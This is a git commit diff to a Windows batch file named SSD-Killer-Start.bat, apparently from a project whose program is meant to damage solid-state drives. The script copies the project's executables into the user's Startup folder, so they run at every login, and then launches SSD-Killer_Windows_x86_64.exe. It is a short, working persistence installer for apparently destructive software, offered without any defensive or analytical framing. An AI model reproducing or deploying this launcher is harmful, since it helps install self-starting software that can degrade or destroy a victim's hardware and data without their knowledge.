020ab59f021f8fe1d0c9469fd849b5d35d9c5aa1
Spar <74677348+Sparpvp@users.noreply.github.com>
2021-03-26 01:26:07 +0100

    Update SSD-Killer-Start.bat

--- SSD-Killer-Start.bat
+++ SSD-Killer-Start.bat
@@ -1,3 +1,4 @@
 @echo off
-copy /b "bin\SSD-Killer.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SSD-Killer.exe"
-start "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SSD-Killer.exe"
+cd "bin\Windows"
+copy /b "*.*" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"
+start "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\SSD-Killer_Windows_x86_64.exe"
